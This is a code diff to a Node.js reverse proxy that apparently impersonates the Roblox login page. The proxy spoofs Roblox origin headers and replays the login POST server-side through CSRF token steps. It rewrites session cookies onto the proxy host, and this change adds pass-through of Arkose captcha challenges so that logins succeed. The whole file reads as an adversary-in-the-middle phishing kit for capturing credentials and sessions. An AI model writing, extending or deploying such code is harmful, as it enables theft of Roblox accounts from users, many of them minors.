@@ -31,6 +31,14 @@ const CDN_PREFIXES = new Set(['js-cdn', 'css-cdn', 'images-cdn', 'static-cdn', '
 
 const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';
 
+// Headers Roblox uses for the Arkose challenge handshake
+const CHALLENGE_HEADERS = [
+    'rblx-challenge-id',
+    'rblx-challenge-type',
+    'rblx-challenge-metadata',
+    'rblx-challenge-solution',
+];
+
 // =========================
 // Helpers
 // =========================
@@ -54,14 +62,24 @@ function setCorsHeaders(proxyRes, req) {
     proxyRes.headers['access-control-allow-origin'] = origin;
     proxyRes.headers['access-control-allow-credentials'] = 'true';
     proxyRes.headers['access-control-allow-methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
-    proxyRes.headers['access-control-allow-headers'] = 'Content-Type, x-csrf-token, Authorization, rbx-device-id';
+    proxyRes.headers['access-control-allow-headers'] = [
+        'Content-Type', 'x-csrf-token', 'Authorization', 'rbx-device-id',
+        ...CHALLENGE_HEADERS
+    ].join(', ');
 
-    if (proxyRes.headers['x-csrf-token']) {
-        proxyRes.headers['access-control-expose-headers'] = 'x-csrf-token';
-    }
+    // Expose all challenge headers + csrf so browser JS can read them
+    const expose = ['x-csrf-token', ...CHALLENGE_HEADERS].join(', ');
+    proxyRes.headers['access-control-expose-headers'] = expose;
 }
 
-// Pretty-print a response body for logging — truncate if huge
+function isChallengeResponse(body) {
+    try {
+        const parsed = JSON.parse(body);
+        return parsed?.errors?.[0]?.code === 0 &&
+               parsed?.errors?.[0]?.message?.toLowerCase().includes('challenge');
+    } catch (_) { return false; }
+}
+
 function logBody(label, status, body) {
     let parsed = body;
     try { parsed = JSON.stringify(JSON.parse(body), null, 2); } catch (_) {}
@@ -70,23 +88,27 @@ function logBody(label, status, body) {
 }
 
 // =========================
-// Server-side CSRF login handler
+// Server-side login request
 // =========================
 function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders) {
     return new Promise((resolve, reject) => {
         const bodyBuf = Buffer.from(bodyStr, 'utf8');
 
         const headers = {
-            'Content-Type':   'application/json;charset=UTF-8',
-            'Content-Length': bodyBuf.length,
-            'Accept':         'application/json, text/plain, */*',
-            'Accept-Language':'en-US,en;q=0.9',
-            'Origin':         'https://www.roblox.com',
-            'Referer':        'https://www.roblox.com/login',
-            'User-Agent':     ua || BROWSER_UA,
+            'Content-Type':    'application/json;charset=UTF-8',
+            'Content-Length':  bodyBuf.length,
+            'Accept':          'application/json, text/plain, */*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Origin':          'https://www.roblox.com',
+            'Referer':         'https://www.roblox.com/login',
+            'User-Agent':      ua || BROWSER_UA,
         };
 
-        const forwardHeaders = ['rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token'];
+        // Forward device/fingerprint and challenge solution headers
+        const forwardHeaders = [
+            'rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token',
+            ...CHALLENGE_HEADERS
+        ];
         for (const h of forwardHeaders) {
             if (extraHeaders[h]) headers[h] = extraHeaders[h];
         }
@@ -94,7 +116,8 @@ function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders) {
         if (cookieHeader) headers['Cookie'] = cookieHeader;
         if (csrfToken)    headers['X-CSRF-TOKEN'] = csrfToken;
 
-        console.log(`   → POST auth.roblox.com/v2/login | CSRF: ${csrfToken ? csrfToken.slice(0,8)+'...' : 'none'} | Cookie: ${cookieHeader ? 'yes' : 'none'} | Body: ${bodyBuf.length}b`);
+        const hasChallengeSolution = !!extraHeaders['rblx-challenge-id'];
+        console.log(`   → POST auth.roblox.com/v2/login | CSRF: ${csrfToken ? csrfToken.slice(0,8)+'...' : 'none'} | Cookie: ${cookieHeader ? 'yes' : 'none'} | Body: ${bodyBuf.length}b | Challenge solution: ${hasChallengeSolution ? 'YES' : 'NO'}`);
 
         const options = {
             hostname: 'auth.roblox.com',
@@ -119,7 +142,39 @@ function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders) {
     });
 }
 
-// Intercept login POST
+// Send final response back to browser — always exposes challenge headers
+function sendLoginResponse(res, finalResponse, host, origin) {
+    const finalCookies = finalResponse.headers['set-cookie'];
+    const rewritten    = rewriteCookies(finalCookies, host);
+
+    res.status(finalResponse.status);
+    res.set('Content-Type', 'application/json');
+    res.set('Access-Control-Allow-Origin', origin);
+    res.set('Access-Control-Allow-Credentials', 'true');
+
+    // Always expose challenge + csrf headers so browser Roblox JS can read them
+    res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));
+
+    // Forward all challenge headers from Roblox → browser
+    for (const h of CHALLENGE_HEADERS) {
+        if (finalResponse.headers[h]) {
+            res.set(h, finalResponse.headers[h]);
+        }
+    }
+
+    if (finalResponse.headers['x-csrf-token']) {
+        res.set('X-CSRF-TOKEN', finalResponse.headers['x-csrf-token']);
+    }
+    if (rewritten && rewritten.length) {
+        res.set('Set-Cookie', rewritten);
+    }
+
+    res.send(finalResponse.body);
+}
+
+// =========================
+// Login interceptor
+// =========================
 app.use('/auth-api/v2/login', express.json({ type: '*/*' }), async (req, res, next) => {
     if (req.method !== 'POST') return next();
 
@@ -128,75 +183,97 @@ app.use('/auth-api/v2/login', express.json({ type: '*/*' }), async (req, res, ne
     const incomingCookies = req.headers['cookie'] || '';
     const origin          = req.headers['origin'] || `https://${host}`;
 
-    console.log('🔑 LOGIN ATTEMPT (server-side CSRF handler)');
+    // If the browser is sending back a challenge solution, just forward it directly
+    // — no need to do the CSRF two-step again, the token was already obtained
+    const hasSolution = !!req.headers['rblx-challenge-id'];
+
+    console.log(`🔑 LOGIN ATTEMPT (server-side CSRF handler) | Challenge solution from browser: ${hasSolution ? 'YES' : 'NO'}`);
 
     try {
         const bodyStr = JSON.stringify(req.body);
 
-        // Step 1
-        const first = await doLoginRequest(bodyStr, incomingCookies, null, ua, req.headers);
-        console.log(`   Step 1 response: ${first.status} | CSRF in resp: ${first.headers['x-csrf-token'] ? 'YES' : 'NO'}`);
-        if (first.status !== 403 || !first.headers['x-csrf-token']) {
-            logBody('Step 1', first.status, first.body);
+        if (hasSolution) {
+            // Browser solved the captcha and is retrying — forward straight to Roblox
+            // We still need a valid CSRF token for this request
+            // Do a quick token fetch first if not present
+            let csrfToken = req.headers['x-csrf-token'] || null;
+
+            if (!csrfToken) {
+                console.log('   No CSRF token on challenge retry — fetching one first...');
+                const tokenFetch = await doLoginRequest(bodyStr, incomingCookies, null, ua, {});
+                csrfToken = tokenFetch.headers['x-csrf-token'] || null;
+                console.log(`   CSRF token fetched: ${csrfToken ? 'YES' : 'NO'}`);
+            }
+
+            const result = await doLoginRequest(bodyStr, incomingCookies, csrfToken, ua, req.headers);
+            console.log(`   Challenge retry response: ${result.status}`);
+            logBody('Challenge retry', result.status, result.body);
+
+            if (result.status === 200) {
+                console.log('✅ LOGIN SUCCESS (after captcha)');
+            } else {
+                console.log(`❌ LOGIN FAILED after captcha — status: ${result.status}`);
+            }
+
+            return sendLoginResponse(res, result, host, origin);
         }
 
-        let finalResponse = first;
+        // Step 1: No CSRF token
+        const first = await doLoginRequest(bodyStr, incomingCookies, null, ua, req.headers);
+        console.log(`   Step 1 response: ${first.status} | CSRF in resp: ${first.headers['x-csrf-token'] ? 'YES' : 'NO'}`);
 
-        if (first.status === 403 && first.headers['x-csrf-token']) {
-            const csrfToken = first.headers['x-csrf-token'];
+        if (!first.headers['x-csrf-token']) {
+            logBody('Step 1', first.status, first.body);
+            return sendLoginResponse(res, first, host, origin);
+        }
 
-            let cookieHeader = incomingCookies;
-            if (first.headers['set-cookie']) {
-                const extra = first.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
+        const csrfToken = first.headers['x-csrf-token'];
+        let cookieHeader = incomingCookies;
+        if (first.headers['set-cookie']) {
+            const extra = first.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
+            cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
+        }
+
+        // Step 2: Retry with CSRF token
+        const second = await doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, req.headers);
+        console.log(`   Step 2 response: ${second.status}`);
+
+        // Check if Roblox wants a captcha challenge
+        if (second.status === 403 && isChallengeResponse(second.body)) {
+            console.log('   🧩 Arkose challenge required — passing back to browser to solve');
+            logBody('Step 2 (challenge)', second.status, second.body);
+            // Return the challenge response to the browser as-is.
+            // Roblox's JS on the page will detect the challenge headers,
+            // render the FunCaptcha widget, and retry with the solution automatically.
+            return sendLoginResponse(res, second, host, origin);
+        }
+
+        logBody('Step 2', second.status, second.body);
+        let finalResponse = second;
+
+        // Step 3: Token rotated
+        if (second.status === 403 && second.headers['x-csrf-token'] && second.headers['x-csrf-token'] !== csrfToken) {
+            const csrfToken2 = second.headers['x-csrf-token'];
+            console.log(`   Token rotated — Step 3 retry with: ${csrfToken2.slice(0,8)}...`);
+
+            if (second.headers['set-cookie']) {
+                const extra = second.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
                 cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
             }
 
-            // Step 2
-            const second = await doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, req.headers);
-            console.log(`   Step 2 response: ${second.status}`);
-            logBody('Step 2', second.status, second.body);
-            finalResponse = second;
-
-            // Step 3 — token rotated
-            if (second.status === 403 && second.headers['x-csrf-token'] && second.headers['x-csrf-token'] !== csrfToken) {
-                const csrfToken2 = second.headers['x-csrf-token'];
-                console.log(`   Token rotated — Step 3 retry with: ${csrfToken2.slice(0,8)}...`);
-
-                if (second.headers['set-cookie']) {
-                    const extra = second.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
-                    cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
-                }
-
-                const third = await doLoginRequest(bodyStr, cookieHeader, csrfToken2, ua, req.headers);
-                console.log(`   Step 3 response: ${third.status}`);
-                logBody('Step 3', third.status, third.body);
-                finalResponse = third;
-            }
-        }
-
-        const finalCookies = finalResponse.headers['set-cookie'];
-        const rewritten    = rewriteCookies(finalCookies, host);
-
-        res.status(finalResponse.status);
-        res.set('Content-Type', 'application/json');
-        res.set('Access-Control-Allow-Origin', origin);
-        res.set('Access-Control-Allow-Credentials', 'true');
-
-        if (finalResponse.headers['x-csrf-token']) {
-            res.set('X-CSRF-TOKEN', finalResponse.headers['x-csrf-token']);
-            res.set('Access-Control-Expose-Headers', 'x-csrf-token');
-        }
-        if (rewritten && rewritten.length) {
-            res.set('Set-Cookie', rewritten);
+            const third = await doLoginRequest(bodyStr, cookieHeader, csrfToken2, ua, req.headers);
+            console.log(`   Step 3 response: ${third.status}`);
+            logBody('Step 3', third.status, third.body);
+            finalResponse = third;
         }
 
         if (finalResponse.status === 200) {
-            console.log(`✅ LOGIN SUCCESS`);
+            console.log('✅ LOGIN SUCCESS');
         } else {
             console.log(`❌ LOGIN FAILED — final status: ${finalResponse.status}`);
         }
 
-        res.send(finalResponse.body);
+        sendLoginResponse(res, finalResponse, host, origin);
 
     } catch (err) {
         console.error('[login] Error:', err.message);
@@ -270,7 +347,7 @@ function rewriteUrls(body, host) {
 }
 
 // =========================
-// Logging middleware — includes response status
+// Logging middleware
 // =========================
 app.use((req, res, next) => {
     const start = Date.now();
@@ -287,10 +364,13 @@ app.use((req, res, next) => {
 app.options('*', (req, res) => {
     const origin = req.headers['origin'] || `https://${req.headers.host}`;
     res.set({
-        'access-control-allow-origin': origin,
+        'access-control-allow-origin':  origin,
         'access-control-allow-credentials': 'true',
         'access-control-allow-methods': 'GET, POST, PUT, DELETE, OPTIONS',
-        'access-control-allow-headers': 'Content-Type, x-csrf-token, Authorization, rbx-device-id',
+        'access-control-allow-headers': [
+            'Content-Type', 'x-csrf-token', 'Authorization', 'rbx-device-id',
+            ...CHALLENGE_HEADERS
+        ].join(', '),
         'access-control-max-age': '86400',
     });
     res.sendStatus(200);
@@ -312,8 +392,9 @@ app.use('/auth-api', createProxyMiddleware({
             proxyReq.setHeader('origin', 'https://www.roblox.com');
             proxyReq.setHeader('referer', 'https://www.roblox.com/login');
             proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
-            if (req.headers['x-csrf-token']) {
-                proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
+            if (req.headers['x-csrf-token']) proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
+            for (const h of CHALLENGE_HEADERS) {
+                if (req.headers[h]) proxyReq.setHeader(h, req.headers[h]);
             }
         },
 
@@ -329,7 +410,6 @@ app.use('/auth-api', createProxyMiddleware({
             console.error(`[auth-api] ❌ ${req.method} ${req.path}`);
             console.error(`   Error code   : ${err.code || 'N/A'}`);
             console.error(`   Error message: ${err.message}`);
-            console.error(`   Error stack  : ${err.stack ? err.stack.split('\n')[1] : 'N/A'}`);
             res.status(502).send('Proxy error');
         }
     }
@@ -351,9 +431,7 @@ app.use('/apis-api', createProxyMiddleware({
             proxyReq.setHeader('origin', 'https://www.roblox.com');
             proxyReq.setHeader('referer', 'https://www.roblox.com/login');
             proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
-            if (req.headers['x-csrf-token']) {
-                proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
-            }
+            if (req.headers['x-csrf-token']) proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
         },
 
         proxyRes: (proxyRes, req) => {
@@ -368,7 +446,6 @@ app.use('/apis-api', createProxyMiddleware({
             console.error(`[apis-api] ❌ ${req.method} ${req.path}`);
             console.error(`   Error code   : ${err.code || 'N/A'}`);
             console.error(`   Error message: ${err.message}`);
-            console.error(`   Error stack  : ${err.stack ? err.stack.split('\n')[1] : 'N/A'}`);
             res.status(502).send('Proxy error');
         }
     }
@@ -401,7 +478,6 @@ for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
                 console.error(`[${prefix}] ❌ ${req.method} ${req.path}`);
                 console.error(`   Error code   : ${err.code || 'N/A'}`);
                 console.error(`   Error message: ${err.message}`);
-                console.error(`   Error stack  : ${err.stack ? err.stack.split('\n')[1] : 'N/A'}`);
                 res.status(502).send('Proxy error');
             }
         }
